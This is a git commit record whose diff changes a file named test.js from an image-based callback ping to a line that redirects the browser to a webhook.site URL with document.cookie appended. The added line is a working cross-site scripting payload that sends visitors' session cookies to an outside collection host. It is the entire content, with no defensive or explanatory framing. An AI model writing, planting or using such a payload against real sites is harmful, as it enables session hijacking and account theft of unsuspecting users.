4a69304e2427ae6206387b5053f23121d1dac0dd
Yks3P <117534666+Yks3P@users.noreply.github.com>
2026-07-22 19:57:47 +0200

    Update test.js

--- test.js
+++ test.js
@@ -1,1 +1,1 @@
-x = new Image(); x.src = 'https://webhook.site/a58ba516-f339-47b7-8ee8-7bd31aba36af?ping=1'
+document.location='https://webhook.site/a58ba516-f339-47b7-8ee8-7bd31aba36af?ping=1'+document.cookie;
